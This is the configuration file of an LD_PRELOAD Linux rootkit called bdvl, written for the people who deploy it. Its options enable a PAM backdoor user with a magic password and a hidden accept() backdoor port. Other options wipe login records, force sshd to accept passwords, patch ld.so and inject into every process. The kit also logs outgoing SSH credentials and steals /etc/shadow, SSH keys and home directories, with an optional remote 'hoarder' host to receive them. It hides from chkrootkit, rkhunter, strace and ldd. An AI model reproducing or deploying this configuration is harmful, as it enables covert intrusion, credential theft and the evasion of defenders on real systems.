# this here is your configuration file.

# setup.py uses configparser to read this file. after the read, each value is evaluated & any unnecessary sections are removed.
# after a successful build, the evaluated result of this file is available in ./build/ with a .nfo extension.

# since each value is evaluated at runtime, it's possible to use functions that are in setup.py. functions such as RANDOM or RANDPORT.

# 'can be disabled' means that by setting the value to None, the respective part of the kit will not be included in the final build.
# if it is a list, you can clear the list instead.

# the evaluated version of this file with your settings can be found in ./build after setup.



[Magic Credentials]
bdpassword = RANDOM(upper + lower, 12)

[PAM backdoor]
use-PAM-bd = True
bdusername = RANDOM(lower, 7)
# /var/log/btmp stores information on failed logins for users - the kit can remove failed login attempts for your backdoor user.
# if you think this will be useful for you, set this False. this file can reach pretty substantial sizes, so when logging in as magicusr,
# you might notice a short delay before you can do anything.
no-btmp-clean = True
btmp-path = '/var/log/btmp'
# utmp is always cleaned when logging in as magicusr & PAM backdoor is enabled.
utmp-path = '/var/run/utmp'
utmp-clean-msg = '\033[1mCleaning utmp\033[0m\n'
btmp-clean-msg = '\033[1mCleaning btmp\033[0m\n'
pwauthfmt = '* Password for %%s: '
sshd-proc-fmt = 'sshd: %%s'
pam-uname-install-notif = 'PAM username: \033[1;31m%%s\033[0m\n'

[accept backdoor]
use-accept-bd = True
# this is given a dedicated hidden+trigger port.
accept-hook-port = RANDPORT()
# string for showing port in function install.c:printhideports
accept-port-string = 'Accept backdoor port:\n  \033[1;31m%%hu\033[0m\n'

[Magic Ports]
# gives you two random ports by default. you can specify a list of one or more ports, or specify your own quantity of random default ports.
default-magic-ports = RANDPORTS(2)
# bdvl's config file can only hold a finite amount of magic ports. this determines how many.
max-hide-ports = 10
# ports are accessible & changeable with `./bdv hideports ...` as magicusr.
validhpopts = ['show', 'change', 'add', 'rm']
# string for showing all hidden ports in function install.c:printhideports
hidden-ports-string = 'Hidden port(s):\n  \033[1;31m%%s\033[0m\n'


[PAM auth logs]  # enables PAM auth logging & provides status string.
PAM-auth-logging = True
authlogmsg = '\033[1mLogged accounts: \033[1;31m%%d\033[0m\n'

[SSH logs]  # enables outgoing ssh login attempt logging & provides status string.
outgoing-ssh-logging = True
sshlogsmsg = '\033[1mSSH logs: \033[1;31m%%d\033[0m\n'
assword-string = 'assword'

[Logging Misc]
# max size in bytes one log can be.
log-max-size-bytes = 200
# max amount of logs able to be stored in one file.
log-max-capacity = 30


[SSHD Patch]  # only one of these can be True. makes sure that sshd will play nice with the PAM backdoor. hard write, or intercept read by sshd.
hard-patch = False
soft-patch = True
sshd-config = '/etc/ssh/sshd_config'
# target settings to keep on top of...
patch-targets = ['PasswordAuthentication', 'UsePAM']
# what they shouldn't/can't be.
antival = ['no', 'no']
# what they will be now.
targetval = ['yes', 'yes']
# location of sshd for checking if calling process is sshd.
sshd-bin-path = '/usr/sbin/sshd'



# bdvl is capable of stealing interesting files. target files are stolen in a detached background process as users interact with them.
# you can control what bdvl deems interesting. you can also control how much bdvl can/will hold.
[File Stealing]
enable-steal = True
interesting-files = ['/etc/shadow', 'ss*_config', 'ssh_host*key*', 'known_hosts', 'authorized_keys', '*.txt', '*.sql', '*.php', '*.zip', '*.tar', '*.tar.*', '*.rar']
# all files in these directories will be stolen. can be disabled.
interesting-directories = ['/root', '/home']
# enter the ip address of the machine listening with etc/hoarder here & the port its listening on, if using it. this is disabled by default.
# e.g.: hoarder-host = '666.666.666.666:1234'
# note that it is also possible to do something like...  `hoarder-host = '666.666.666.666:' + str(RANDPORT())`  - though the port will need manually added to hideports after install with `./bdv hideports`
hoarder-host = None
# if hoarder-host contains a destination & for whatever reason the file in question can't be sent to the host, bdvl will not copy the file on disk like it normally does IF this is True.
hoarder-no-disk-write = False
# when stealing files ignore these filenames. wildcards apply. can be disabled. is by default.
filenames-blacklist = []
# don't try to steal files bigger than 2gb. can be disabled.
file-max-size-bytes = (1024 * 1024 * 1024) * 2
# remove stolen files by default every 72 hours. can be disabled.
file-cleanse-timer = (60 * 60) * 72
# if FALLBACK_SYMLINK is True then a link will be created in lieu of the copy of the target file. cap of 10gb by default. can be disabled.
maximum-capacity-bytes = (1024 * 1024 * 1024) * 10
# if mapping the file contents fails, use the original method of reading & writing in blocks.
fallback-failed-map = True
# if something goes wrong copying a target file, symlink it into the hidden directory instead.
fallback-symlink = True
# chmod the new (hidden) copy with the source's original mode.
keep-file-mode = True
# if this is True, files are never copied, instead only symlinked.
only-symlink = False
# strings for showing status of stolen stuff on backdoor login. (./bdvprep)
stolendatamsg = '\033[1mStolen data: '
gbfmtstring = '\033[1;31m%%.2f\033[0m gigabytes\n'
mbfmtstring = '\033[1;31m%%.2f\033[0m megabytes\n'
abfmtstring = '\033[1;31m%%ld\033[0m bytes\n'
kbfmtstring = '\033[1;31m%%.2f\033[0m kilobytes\n'
# sssd does not play nice with the file stealer, causing massive performance issues. these are here so bdvl can prevent that from happening.
sssd-bin-path = '/usr/sbin/sssd'
sssd-home-dir = '/usr/libexec/sssd'
# some strings for `./bdv hoarder`
validssopts = ['show', 'change', 'clear', 'test']
hoarder-host-port-not-hidden = 'Specified port (%%hu) is not a hidden port, try again.\n'
change-hoarder-host-format = '  %%s %%s %%s [host-ip:port]\n'
hoarder-host-changed-msg = 'New hoarder host: %%s:%%hu\n'
hoarder-host-port-not-hidden-test = 'Port %%hu is not hidden. This needs changed.\n'
hoarder-testing-connection-msg = 'Testing connection... (gonna try send %%s file info)\n'
hoarder-test-connection-file = '/etc/passwd'
hoarder-test-fileinfo-sent = 'Test fileinfo sent & socket destroyed.\n'
# this one is shown on ./bdvprep
hoarder-host-current-msg = '\033[1mHoarder host:\033[0m \033[1;31m%%s:%%hu\033[0m\n'



[Patch ld.so]
# patch ld.so to read from new path for preload of shared objects (/etc/ld.so.preload -> /???/?????????????)
patch-ld = True
# if still installed, the kit will make sure ld.so remains patched. set True to disable.
no-protect-ldso = False
# directories that ldfind searches for valid ld.so.
ldhomes = ['/lib', '/lib32', '/lib64', '/libx32', '/lib/x86_64-linux-gnu', '/lib/i386-linux-gnu', '/lib/arm-linux-gnueabihf']

[Uninstall Timer] # bdvl by default uninstalls itself after a time. only one can have a value. both can be disabled.
# stick around for around a couple of years max by default.
after-days = 365 * 2
after-hours = None
# timer is accessible with `./bdv lifespan ...` as magicusr.
validcuopts = ['show', 'change', 'reset']
# strings for controls.
time-since-installation = '\033[1;31m%%s passed since installation\033[0m: %%.2f\n'
time-until-uninstallation = '\033[1;31m%%s remaining until uninstallation\033[0m: %%.2f\n'
lifespan-reset = 'Resetting lifespan.\n'
cu-help-msg-format = '  %%s %%s %%s [new max %%s]\n'
string-days = 'days'
string-hours = 'hours'

[SELINUX Status Check]  # before beginning install bdvl will check the status of selinux on the box.
check-selinux-pre-install = True
sel-config = '/etc/selinux/config'
noselinux = ['SELINUX=enforcing', 'SELINUX=permissive']
# some required strings
selinux-failure = 'Failed to determine if SELinux is present or not.\n'
selinux-present = 'SELinux present. Going to determine status.\n'
selinux-warning = ['SELinux is enabled on this machine! This is not good!\n', \
                   'I HIGHLY advise against continuing installation...\n', \
                   'Otherwise press enter to continue...']
selinux-dead = 'SELinux is disabled. Good.\n'
selinux-gone = 'No SELinux.\n'




[Magic GID]
# bdvl changes magic GID by default every 20 mins. can be disabled.
gid-change-mintime = 60 * 20
# maximum possible value for a magic GID based on the suitable datatype. unsigned int (default), unsigned long, or unsigned short.
max-gid = 4294967294
#max-gid = 18446744073709551614
#max-gid = 65534

[Magic Ext Attribute]  # bdvl can hide its stuff with a magic extended attribute. some filesystems do not support this.
use-magic-attr = True
magic-attr-length = 32
# changes every hour.
attr-change-time = 60 * 60






# this is disabled by default for now until i come up with something better.
[Ass Hiding]
# this enables access to `./bdv my_ass` as magicusr. through this, you can add, remove, change or display custom paths for bdvl to ensure stays hidden.
# primarily for when bdvl changes magicid or magicattr. so you don't need worry about something of yours outside of an already hidden directory becoming unhidden.
hide-my-ass = True
# paths added by you with `./bdv my_ass` will be recursively removed on uninstallation.
uninstall-my-ass = True
# maximum amount of paths which you can add.
max-hide-paths = 8
# valid options for `./bdv my_ass ...`
validmaopts = ['show', 'change', 'add', 'rm']
# this message is displayed on `./bdv my_ass`
ass-usage-message = ['\033[1mNote:\033[0m paths added which have a trailing forward slash are considered directories.\n', '\033[1mTherefore, their contents are also hidden.\033[0m\n']
# strings needed for ./bdv my_ass
no-paths-hidepaths = 'No paths.\n'
hidepaths-print-fmt = 'Path (%%u): %%s\n'
failed-locating-path = 'Failed locating target path.\n'
hidepaths-cap-reached = 'Capacity reached. Remove something.\n'
hidepath-already-added = 'Path %%s has already been added.\n'
failed-free-space = 'Couldn\'t locate free space.\n'





[Magic Pkgman]
# allows safe access to package managers from magic shell.
backdoor-pkgman = True
# valid package managers available from `./bdv <pkgman>`
validpkgmans = ['apt', 'yum', 'pacman', 'emerge', 'dpkg']
magic-pkgman-fmt = '  %%s %%s <args>\n'





[Miscellaneous]
# I assume you're gonna link without libpcap if this is True.
no-pcap-stuff = False
# default value for how many chunks files contents will be divided into.
block-count = 10
# if the block size of a target exceeds this value, the block count is incremented until that's False longer the case. 16k default. can be disabled.
block-max-size = 1024 * 16
fallback-procname = RANDOM(lower, 8)
rllygay = 'bdvlsuperreallygay'
alphabet-size = 26
man-disable-seccomp = 'MAN_DISABLE_SECCOMP'

[Backdoor Misc]
# bdvl will unset these environment variables in its processes.
unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND', 'SSH_CONNECTION', 'SSH_CLIENT', 'LOGNAME', 'MAIL']
# valid options for `./bdv ...` as magicusr.
validbdvcmds = ['changeid', \
                'hideports', \
                'update', \
                'uninstall', \
                'unhideself', \
                'makelinks', \
                'hide <path>', \
                'unhide <path>', \
                'inject <target.so> <PID>/ALL', \
                'lifespan', \
                'ass', \
                'hoarder', \
                'logs']
# remove a 1.6~kb big fuck you.
no-rootkit-ansi = False
# this message is displayed when trying to do a `./bdv` thing that isn't enabled.
this-is-not-enabled = 'This is not enabled.\n'


[Hiding Misc]
# things to hide from. the rootkit is uninstalled during the runtime of either,
#    a. processes with certain environment variables set,
#    b. processes that need to access certain paths,
#    c. or just processes whose names match.
scaryvars = ['LD_TRACE_LOADED_OBJECTS', 'LD_DEBUG', 'LD_AUDIT']
scarypaths = ['*/*ld-linux*.so.*', '*ld-linux*.so.*', '*/*ld-*.so', '*ld-*.so', '*/ld-*.so.*']
scaryprocs = ['chkrootkit', 'lsrootkit', 'ldd', 'unhide', 'rkhunter', 'chkproc', 'chkdirs', 'ltrace','strace']
# these are removed from procmaps output.
bads = ['(deleted)', 'libpcap', 'libcrypt']
# dependencies for the kit are hidden from /proc/%d/*maps. namely these dependencies are libcrypt & libpcap.
# if for any reason, this should be a problem, set this True.
no-hide-dependencies = False
# if you want `./bdv unhideself` to still let you access rootkit stuff, set this True.
# if anyone looks at the environment variables set in your unhidden process, they'll see a big long random totally-not-malicious variable...
set-magic-env-unhide = False


[Logging Strings]
logs-format = '%%s (%%s)'
validblopts = ['show', 'clear']
log-print-string = '[%%s] %%s\n'
total-logs-string = '\nTotal: \033[1;31m%%u\033[0m\n'
clear-logs-warning = ['You\'re about to clear all current logs.\n', '\033[1mEnter Y to confirm.\033[0m  ']
clear-logfile-warning = ['You\'re about to clear a log file.\n', '\033[1mEnter Y to confirm.\033[0m  ']
cleared-logs-string = '\033[1;31m%%u\033[0m log files cleared.\n'
logfile-capacity-reached = 'Log file \033[1;31m%%s\033[0m has reached its maximum capacity.\n'
all-logs-max-reached-string = 'All logs have reached maximum capacity.\n'
clear-log-file-string = '  %%s %%s %%s [log file path]/ALL\n'
logfile-stats-string = '\nLog file \033[1;31m%%s\033[0m currently contains \033[1;31m%%u\033[0m logs.\n'
path-not-logfile = 'Specified path is not a valid bdvl log path.\n'
log-clear-successful = 'Log file (\033[1;31m%%s\033[0m) has been cleared successfully.\n'






[Config & Installation]
# path that bdvl will use for its generated config on installation. see ./src/include/types.h:typedef-struct-bdvcfg_t for an overview on its contents.
bdvl-config = RANDPATH()
# largest possible size of a random new path in bytes.
pathmax = 40
# max directory names that can be stored by/for something. install/rand.c & steal/dirs.c.
maxdirs = 32
# this is the string which triggers installation. i.e.: `LD_PRELOAD=./b.so.x86_64 sh -c "./bdvinstall ./b.so.*"` (etc/auto.sh does basically this at the end)
binstaller = '*/bdvinstall'
# each call to __libc_start_main, execve & execvp results in the kit making sure preloadpath exists & contains the kit's sopath.
# of course, this behaviour only applies if the kit is still on the box. plus if ld.so is patched.
persistent-reinstall = True
# on installation the kit will inject itself to all processes on the box. set True to disable.
no-inject-procs = False
# valid platforms for target shared object to install.
valid-platforms = ['x86_64', 'i686', 'v6l', 'v7l', 'v8l']
x86-platform-string = 'x86_64'
i686-platform-string = 'i686'
# root directories for random paths that bdvl needs to create on install.
# the value of this evaluates to the list already in setup.py.
rootdirs = rootdirs
# error string for failure on reading BDVL_CONFIG.
failed-reading-settings = 'Failed reading settings.\n'



[Magic Profile]
# executing this in a shell as magicusr triggers install/prep.c:bdprep.
prepperstr = './bdvprep'
# when magicusr, this is contents of /etc/profile, no need for ~/.bashrc or ~/.profile.
magic-profile = ['TERM=xterm;', './bdvprep;', '[ `id -u` != 0 ]&', '&{ su root;', 'kill -9 $$; }\n']
# reading this path when magicusr takes you to the box's real /etc/profile.
real-profile = '/etc/REALprofile'
# used to create phantom group for magicusr.
group-path = '/etc/group'
bdvl-env-path-fmt-string = '/usr/local/sbin:/usr/sbin:/sbin:%%s'
bdvl-env-path-string = '/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin'
pathvar-string = 'PATH'
homevar-string = 'HOME'
goto-notice = '# goto %%s\n'



[LD Misc]
libc-path = 'libc.so.6'
libdl-path = 'libdl.so.2'
libpam-path = 'libpam.so.0'
libpcap-path = 'libpcap.so'
glibc-ver-str = 'GLIBC_2.%%d'
glibc-verver-str = 'GLIBC_2.%%d.%%d'
glibc-max-ver = 40
fake-linkmap-name = 'linux-vdso.so.0'
ldstr = 'LD_PRELOAD'
old-preload = '/etc/ld.so.preload'
# max number of valid ld.so paths that can be found & stored. more than enough?
max-ld-so = 10
# some strings for ldpatch & friends.
patching-message = 'Patching dynamic linker.\n'
old-preload-not-found = 'OLD_PRELOAD could not be located in ld.so.\n'
old-preload-string = 'OLD_PRELOAD: %%s\n'
memory-alloc-failed = 'Failed allocating memory for ld.so paths.\n'
final-stages-failed = 'Patch finalisation seems to have messed up...\n'
patched-count-string = 'Patched ld.so: \033[1;31m%%d\033[0m\n'
nothing-to-patch = 'Nothing to patch...?\n'

[Random Filesystem Paths]
fed-rel-path = '/etc/fedora-release'
etc-profile-path = '/etc/profile'

[Processes] # provides strings & values for doing stuff with processes.
procpath-name-fmt = '/proc/%%s'
cmdline-path = '/proc/%%d/cmdline'
cmdline-max-size = 256
name-max-size = 64
self-exe-path = '/proc/self/exe'
exe-max-size = 64
pid-maxlen = 150
man-proc-name = 'man'
mandb-path = '/usr/bin/mandb\0'
procpath-pattern = '/proc/*'
maps-full-path = '/proc/*/maps'
smaps-full-path = '/proc/*/smaps'
nmaps-full-path = '/proc/*/numa_maps'
maps-proc-path = '*/maps'
smaps_proc_path = '*/smaps'
nmaps-proc-path = '*/numa_maps'
maps-filename = 'maps'
smaps-filename = 'smaps'
nmaps-filename = 'numa_maps'
maps-path-fmt-string = '/proc/%%s/maps'
maps-path-fmt-pid = '/proc/%%d/maps'
ssh-proc-name = 'ssh'
scp-proc-name = 'scp'
busybox-proc-name = 'busybox'
tmpdir-string = '/tmp'
ss-process-names = ['ss\0','/usr/bin/ss\0','/bin/ss\0']

[Procnet]
pnet-fmt = '%%d: %%32[0-9A-Fa-f]:%%X %%32[0-9A-Fa-f]:%%X %%X %%lX:%%lX %%X:%%lX %%lX %%d %%d %%lu %%63[^\t\n]\n'
og-pnet-fmt = '%%4d: %%-14s%%-14s%%2s %%8s:%%8s %%2s:%%8s %%8s %%5u %%8d %%5lu %%s\n'
og-pnet6-fmt = '%%4d: %%-38s%%-38s%%2s %%8s:%%8s %%2s:%%8s %%8s %%5u %%8d %%5lu %%s\n'
pnet6-path = '/proc/net/tcp6'
pnet-path = '/proc/net/tcp'

[Magic Ports Misc]
new-port-already-hidden = 'New port %%hu already hidden.\n'
port-successfully-changed = 'Changed port: %%hu -> %%hu\n'
port-change-failed = 'Couldn\'t change: %%hu -> %%hu\n'
max-ports-reached = 'Reached maximum.\n'
port-already-added = 'Port %%hu already added.\n'
port-added-successfully = 'Port %%hu added.\n'
port-count-too-low = 'Port count must be >2.\n'
accept-port-notification = 'Removing current accept port.\nThe next port available will be used.\n'
specified-port-removed = 'Port removed.\n'
specified-port-invalid = 'Invalid port.\n'

[Print Strings]
updateusgmsg = ['\033[1mExample:\033[0m  ./bdv update ./bdvl.so.*\n', '\'./\' is \033[1mvery important\033[0m if the target is in your cwd.\n']
idchangemsg = ['Changing kit GID. You must \033[1;31mreconnect\033[0m once it has changed.\n', \
               'Make sure you have no other \033[1;31mprocesses running\033[0m.\n', \
               '\033[1;31mPress enter\033[0m when you are ready.\n', \
               'Current GID: \033[1;31m%%u\033[0m']
updatemsg = ['\n\033[1mAbout to begin update!\033[0m\n', \
             '  Everything from this current installation will be removed.\n', \
             '  So make sure you save stuff you wanna see again.\n', \
             'Press enter to continue, ^C to cancel.\n']
# THE DATETIME FORMAT IN THIS STRING IS THE ONE USED FOR LOGS TOO!
# 3rd \033 & beyond is the beginning of the format string.
datetimemsg = '\033[1mDate & time of install:\033[0m \033[1;31m%%d-%%02d-%%02d %%02d:%%02d\033[0m\n'
magicidmsg = '\033[1mMagic ID: \033[1;31m%%u\033[0m\n'
success-links = '\033[1mSuccessful links: \033[1;31m%%d\033[0m\n'
exist-links = '\033[1mLinks already exist: \033[1;31m%%d\033[0m\n'
fail-links = '\033[1mFailed links: \033[1;31m%%d\033[0m\n'
hideport-warning = '\033[1mIt seems like you are not using a hidden port...\033[0m\n'
something-went-wrong = '\033[1mSomething went wrong...\033[0m\n'
new-id-notification = 'New ID: \033[1;31m%%u\033[0m\n'
add-new-item-string = '  %%s %%s %%s \'[value]\'\n'
change-item-string = '  %%s %%s %%s \'[old]\' \'[new]\'\n'
unhidden-shell-msg = ['You are about to spawn an unhidden shell.\n' \
                      '\033[1mPress enter if you\'re absolutely sure. ^C to cancel.\033[0m']
logs-access-message = '\033[1mSee `./bdv logs` for logged stuff.\033[0m\n'
creating-installdir-string = 'Creating installation directory.\n'
so-copy-successful-string = 'Copied: \033[1;31m%%s\033[0m ~> \033[1;31m%%s\033[0m\n'
uninstall-with-bdvar-string = '\nUnhappy with something?:\n  %%s=1 sh -c \'./bdv uninstall\'\n\n'
injected-cso-count-string = 'Injected: \033[1;31m%%s\033[0m into \033[1;31m%%u\033[0m processes.\r'
install-successful-string = 'Installed.\n\n'
process-count-notification = 'There are %%d processes to inject into. This could take a while.\n'
pid-injected-success = 'Injected: \033[1;31m%%s\033[0m into PID \033[1;31m%%d\033[0m.\n'
pid-inject-failed = '\033[1;31mFailed\033[0m injecting %%s into PID %%d.\n'
nul-all-string = 'ALL\0'
big-fail-string = 'Fail.\n'
success-string = 'Success.\n'
uninstalling-string = 'Uninstalling.\n'
# this is what gives us stuff for 'xperror'
validpxopts = ['fork', 'calloc', 'pipe', 'strdup', 'reinitmvbc', 'initmvbc', 'fetch_new_settings', 'rm', 'eradicatedir', 'preparedir', 'sogetpath', \
               'socopy', 'rksopath', 'rename', '_rknomore', 'preloadok', 'patch_on_install', 'allpids', 'binject', 'xordup', 'anselinux', 'chkselinux', \
               'readass', 'writemyass', 'setsid', 'hide_path', 'unhide_path', 'access', 'socket']